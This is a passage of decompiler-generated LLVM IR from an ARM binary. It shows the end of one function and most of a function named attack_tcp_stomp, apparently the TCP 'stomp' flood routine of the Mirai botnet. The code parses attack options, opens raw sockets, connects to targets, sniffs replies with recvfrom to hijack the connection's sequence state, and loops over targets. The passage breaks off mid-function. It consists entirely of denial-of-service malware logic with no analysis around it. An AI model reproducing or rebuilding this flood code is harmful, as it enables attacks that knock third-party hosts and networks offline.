  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v7_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 6, 5, 8, 7, 9, 14, 10, 11, 12, 13, 17, 15, 16, 19, 18, 20, 23, 22, 21, 24, 25, 26, 28, 29, 27, 30, 32, 31, 33, 34, 35, 37, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f78, { 1, 0 }
  uselistorder label %dec_label_pc_9f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9bd0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9b3c, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a0b0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a0cc = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a0d8 = load i32, i32* @r6, align 4
  store i32 %v0_a0d8, i32* %r0.global-to-local, align 4
  %v2_a0dc = call i32 @calloc(i32 %v0_a0d8, i32 4)
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  store i32 %v0_a0f0, i32* %r0.global-to-local, align 4
  %v5_a0f4 = inttoptr i32 %v0_a0e0 to i32*
  %v6_a0f4 = call i32 @attack_get_opt_int(i32 %v0_a0f0, i32* %v5_a0f4, i32 2, i32 0, i32 %v2_a0dc)
  %v1_a100 = urem i32 %v6_a0f4, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v0_a10c, i32* %r1.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  store i32 %v0_a110, i32* %r0.global-to-local, align 4
  %v5_a114 = trunc i32 %v6_a0f4 to i8
  %v7_a118 = inttoptr i32 %v0_a10c to i32*
  %v8_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v7_a118, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_a0f4)
  %v0_a11c = load i32, i32* @r5, align 4
  store i32 %v0_a11c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_a118, i32* @r7, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a130 = inttoptr i32 %v0_a11c to i32*
  %v6_a130 = call i32 @attack_get_opt_int(i32 %v0_a12c, i32* %v5_a130, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a138 = urem i32 %v6_a130, 256
  store i32 %v1_a138, i32* %ip.global-to-local, align 4
  %v0_a13c = load i32, i32* @r5, align 4
  store i32 %v0_a13c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a130, 16777216
  %v5_a150 = sdiv i32 %sext, 16777216
  %v6_a150 = inttoptr i32 %v0_a13c to i32*
  %v7_a150 = call i32 @attack_get_opt_int(i32 %v0_a148, i32* %v6_a150, i32 5, i32 1, i32 %v5_a150)
  %v1_a15c = urem i32 %v7_a150, 256
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_a164 = load i32, i32* @r5, align 4
  store i32 %v0_a164, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a16c = load i32, i32* @r4, align 4
  store i32 %v0_a16c, i32* %r0.global-to-local, align 4
  %v6_a174 = inttoptr i32 %v0_a164 to i32*
  %v7_a174 = call i32 @attack_get_opt_int(i32 %v0_a16c, i32* %v6_a174, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_a15c)
  %v0_a178 = load i32, i32* @r5, align 4
  store i32 %v0_a178, i32* %r1.global-to-local, align 4
  %v3_a17c = mul i32 %v7_a174, 65536
  store i32 %v3_a17c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v3_a18c = urem i32 %v7_a174, 65536
  store i32 %v3_a18c, i32* @sl, align 4
  %v5_a190 = inttoptr i32 %v0_a178 to i32*
  %v6_a190 = call i32 @attack_get_opt_int(i32 %v0_a188, i32* %v5_a190, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @attack_get_opt_int(i32 %v0_a1a8, i32* %v5_a1b0, i32 12, i32 1, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @attack_get_opt_int(i32 %v0_a1c8, i32* %v5_a1d0, i32 13, i32 1, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @attack_get_opt_int(i32 %v0_a1e8, i32* %v5_a1f0, i32 14, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a1fc = load i32, i32* @r5, align 4
  store i32 %v0_a1fc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a1fc to i32*
  %v6_a210 = call i32 @attack_get_opt_int(i32 %v0_a208, i32* %v5_a210, i32 15, i32 0, i32 %v1_a1f8)
  %v1_a218 = urem i32 %v6_a210, 256
  store i32 %v1_a218, i32* %ip.global-to-local, align 4
  %v0_a21c = load i32, i32* @r5, align 4
  store i32 %v0_a21c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a228 = load i32, i32* @r4, align 4
  store i32 %v0_a228, i32* %r0.global-to-local, align 4
  %v5_a230 = inttoptr i32 %v0_a21c to i32*
  %v6_a230 = call i32 @attack_get_opt_int(i32 %v0_a228, i32* %v5_a230, i32 16, i32 0, i32 %v1_a218)
  %v1_a238 = urem i32 %v6_a230, 256
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r5, align 4
  store i32 %v0_a244, i32* %r1.global-to-local, align 4
  %v0_a248 = load i32, i32* @r4, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v5_a250 = inttoptr i32 %v0_a244 to i32*
  %v6_a250 = call i32 @attack_get_opt_int(i32 %v0_a248, i32* %v5_a250, i32 0, i32 768, i32 %v1_a238)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a260 = load i32, i32* @r5, align 4
  store i32 %v0_a260, i32* %r1.global-to-local, align 4
  %v0_a264 = load i32, i32* @r4, align 4
  store i32 %v0_a264, i32* %r0.global-to-local, align 4
  %v5_a268 = inttoptr i32 %v0_a260 to i32*
  %v6_a268 = call i32 @attack_get_opt_int(i32 %v0_a264, i32* %v5_a268, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a270 = urem i32 %v6_a268, 256
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a284 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v7_a288 = icmp eq i32 %v3_a284, -1
  store i1 %v7_a288, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a284, i32* @sb, align 4
  br i1 %v7_a288, label %dec_label_pc_a478, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a29c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a29c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a2b0 = call i32 @__GI_setsockopt(i32 %v3_a284, i32 0, i32 3, i32 %v6_a29c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a2b0, i32* %r0.global-to-local, align 4
  %v7_a2b4 = icmp eq i32 %v5_a2b0, -1
  store i1 %v7_a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2b4, label %dec_label_pc_a470, label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a294
  %v0_a2bc = load i32, i32* @r7, align 4
  %v3_a2bc = mul i32 %v0_a2bc, 65536
  store i32 %v3_a2bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a2c4 = load i32, i32* @r6, align 4
  %v2_a2c4 = icmp eq i32 %v0_a2c4, 0
  store i1 %v2_a2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a2cc = urem i32 %v0_a2bc, 65536
  store i32 %v3_a2cc, i32* @fp, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a6fc, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %dec_label_pc_a2bc
  %v2_a320 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a364 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a39c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a3a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a3ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_a40c = zext i8 %tmp to i32
  %v1_a410 = and i32 %v4_a40c, 18
  %v2_a414 = icmp eq i32 %v1_a410, 18
  %v3_a3f8 = sext i16 %tmp61 to i32
  %v1_a41c = and i32 %v4_a40c, 5
  %v2_a41c = icmp eq i32 %v1_a41c, 0
  %v4_a35c = add i32 %v2_a320, 82
  %v5_a35c = inttoptr i32 %v4_a35c to i16*
  %v1_a54c = add i32 %v6_a250, 40
  %v1_a660 = urem i32 %v6_a190, 2
  %tmp95 = sub nsw i32 0, %v1_a660
  %v4_a668 = and i32 %tmp95, 32
  %v1_a678 = urem i32 %v6_a1b0, 2
  %tmp96 = sub nsw i32 0, %v1_a678
  %v4_a680 = and i32 %tmp96, 16
  %v1_a690 = urem i32 %v6_a1d0, 2
  %tmp97 = sub nsw i32 0, %v1_a690
  %v4_a698 = and i32 %tmp97, 8
  %v1_a6a8 = urem i32 %v6_a1f0, 2
  %tmp98 = sub nsw i32 0, %v1_a6a8
  %v4_a6b0 = and i32 %tmp98, 4
  %v1_a6c0 = urem i32 %v6_a210, 2
  %tmp99 = sub nsw i32 0, %v1_a6c0
  %v3_a6c8 = and i32 %tmp99, 2
  %v1_a6d8 = urem i32 %v6_a230, 2
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4.preheader, %dec_label_pc_a448
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a448 ], [ %tmp34, %dec_label_pc_a2d4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a448 ], [ %tmp37, %dec_label_pc_a2d4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2e0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v7_a2e4 = icmp eq i32 %v3_a2e0, -1
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2e0, i32* @r5, align 4
  br i1 %v7_a2e4, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a424
  %v0_a2f8 = phi i32 [ %v3_a438, %dec_label_pc_a424 ], [ %v3_a2e0, %dec_label_pc_a2d4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a424 ], [ %stack_var_-62.0, %dec_label_pc_a2d4 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4f8, %dec_label_pc_a424 ], [ %stack_var_-60.0, %dec_label_pc_a2d4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a2f8 = call i32 @__libc_fcntl(i32 %v0_a2f8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a300 = or i32 %v2_a2f8, 2048
  store i32 %v1_a300, i32* @r2, align 4
  %v0_a304 = load i32, i32* @r5, align 4
  store i32 %v0_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %v0_a304, i32 4)
  %v3_a30c = load i32, i32* %stack_var_-44, align 4
  %v5_a314 = mul i32 %v3_a30c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a328 = add i32 %v5_a314, %arg2
  store i32 %v2_a328, i32* %r3.global-to-local, align 4
  %v1_a32c = add i32 %v2_a328, 20
  %v2_a32c = inttoptr i32 %v1_a32c to i8*
  %v3_a32c = load i8, i8* %v2_a32c, align 1
  %v4_a32c = zext i8 %v3_a32c to i32
  store i32 %v4_a32c, i32* %r2.global-to-local, align 4
  %v2_a330 = icmp ugt i8 %v3_a32c, 30
  %v7_a330 = icmp eq i8 %v3_a32c, 31
  store i1 %v7_a330, i1* %cpsr_z.global-to-local, align 1
  %v2_a334 = xor i1 %v7_a330, true
  %v3_a334 = and i1 %v2_a330, %v2_a334
  br i1 %v3_a334, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2f0
  %v5_a334 = add i32 %v2_a328, 16
  %v6_a334 = inttoptr i32 %v5_a334 to i32*
  %v7_a334 = load i32, i32* %v6_a334, align 4
  store i32 %v7_a334, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2f0, %bb
  %v4_a338 = phi i32 [ %v2_a328, %dec_label_pc_a2f0 ], [ %v7_a334, %bb ]
  %v4_a338.stack_var_-60.1 = select i1 %v3_a334, i32 %v4_a338, i32 %stack_var_-60.1
  %v2_a33c = xor i1 %v2_a330, true
  %v3_a33c = or i1 %v7_a330, %v2_a33c
  br i1 %v3_a33c, label %dec_label_pc_a484, label %dec_label_pc_a340

dec_label_pc_a340:                                ; preds = %bb71, %dec_label_pc_a484
  %v0_a4f8 = phi i32 [ %v5_a4d4, %dec_label_pc_a484 ], [ %v4_a338.stack_var_-60.1, %bb71 ]
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @sl, align 4
  %v9_a348 = icmp eq i32 %v0_a348, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a4e0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a340
  %v4_a34c = udiv i32 %v0_a348, 256
  %v2_a350 = urem i32 %v0_a348, 256
  store i32 %v2_a350, i32* %r2.global-to-local, align 4
  %v5_a354 = mul nuw nsw i32 %v2_a350, 256
  %v6_a354 = or i32 %v5_a354, %v4_a34c
  store i32 %v6_a354, i32* %r3.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  %v2_a35c = trunc i32 %v6_a354 to i16
  store i16 %v2_a35c, i16* %v5_a35c, align 2
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %.thread9, %dec_label_pc_a4e0
  %stack_var_-62.2 = phi i16 [ %v1_a4e0, %dec_label_pc_a4e0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a36c = load i32, i32* @r5, align 4
  store i32 %v0_a36c, i32* %r0.global-to-local, align 4
  %v3_a370 = call i32 @__libc_connect(i32 %v0_a36c, i32 %v2_a364, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a378 = call i32 @__GI_time(i32* null)
  store i32 %v2_a378, i32* %r0.global-to-local, align 4
  store i32 %v2_a378, i32* @r4, align 4
  %v9_a3d8 = icmp eq i32 %tmp35, %v0_a4f8
  %v4_a400 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a3d8 to i32
  %v9_a3ec = icmp eq i1 %v9_a3d8, false
  %v9_a404 = icmp eq i32 %v3_a3f8, %v4_a400
  br label %dec_label_pc_a394

dec_label_pc_a384:                                ; preds = %.thread, %dec_label_pc_a3f4, %dec_label_pc_a41c, %bb74
  %v2_a384 = call i32 @__GI_time(i32* null)
  %v0_a388 = load i32, i32* @r4, align 4
  %v2_a388 = sub i32 %v2_a384, %v0_a388
  store i32 %v2_a388, i32* %r0.global-to-local, align 4
  %v7_a38c = icmp eq i32 %v2_a388, 10
  store i1 %v7_a38c, i1* %cpsr_z.global-to-local, align 1
  %v8_a390 = icmp sgt i32 %v2_a388, 10
  br i1 %v8_a390, label %dec_label_pc_a424, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a364
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a3a8, i32* %r1.global-to-local, align 4
  store i32 %v2_a3ac, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a3b4 = load i32, i32* @sb, align 4
  store i32 %v0_a3b4, i32* %r0.global-to-local, align 4
  %v6_a3bc = call i32 @__libc_recvfrom(i32 %v0_a3b4, i32 %v2_a3a8, i32 256, i32 16384, i32 %v2_a39c, i32 %v2_a3ac)
  store i32 %v6_a3bc, i32* %r2.global-to-local, align 4
  %v7_a3c4 = icmp eq i32 %v6_a3bc, -1
  store i1 %v7_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a3c4, label %dec_label_pc_a478, label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a394
  store i32 %v0_a4f8, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3e4 = icmp eq i32 %v6_a3bc, 40
  store i1 %v7_a3e4, i1* %cpsr_z.global-to-local, align 1
  %tmp100 = icmp ult i32 %v6_a3bc, 41
  br i1 %tmp100, label %.thread, label %bb74

.thread:                                          ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a384

bb74:                                             ; preds = %dec_label_pc_a3d0
  store i1 %v9_a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ec, label %dec_label_pc_a384, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %bb74
  store i32 %v3_a3f8, i32* @lr, align 4
  store i32 %v2_a320, i32* @r3, align 4
  store i32 %v4_a400, i32* %r2.global-to-local, align 4
  store i1 %v9_a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a404, label %dec_label_pc_a40c, label %dec_label_pc_a384

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3f4
  store i32 %v4_a40c, i32* %r2.global-to-local, align 4
  store i32 %v1_a410, i32* @r3, align 4
  store i1 %v2_a414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a414, label %dec_label_pc_a4f0, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a40c
  store i1 %v2_a41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a41c, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a384
  %v0_a424 = load i32, i32* @r5, align 4
  store i32 %v0_a424, i32* %r0.global-to-local, align 4
  %v1_a428 = call i32 @__GI___libc_close(i32 %v0_a424)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a438 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v3_a43c = icmp eq i32 %v3_a438, -1
  %v8_a43c = icmp eq i32 %v3_a438, -1
  store i1 %v8_a43c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a438, i32* @r5, align 4
  br i1 %v3_a43c, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a448:                                ; preds = %dec_label_pc_a424, %dec_label_pc_a2d4, %bb81
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a2d4 ], [ %stack_var_-62.2, %bb81 ], [ %stack_var_-62.2, %dec_label_pc_a424 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a2d4 ], [ %v0_a4f8, %bb81 ], [ %v0_a4f8, %dec_label_pc_a424 ]
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v1_a44c = add i32 %v3_a448, 1
  store i32 %v1_a44c, i32* @r3, align 4
  %v1_a450 = load i32, i32* @r6, align 4
  %v9_a450 = icmp eq i32 %v1_a44c, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a44c, i32* %stack_var_-44, align 4
  %v5_a458 = icmp slt i32 %v1_a44c, %v1_a450
  br i1 %v5_a458, label %dec_label_pc_a2d4, label %dec_label_pc_a45c

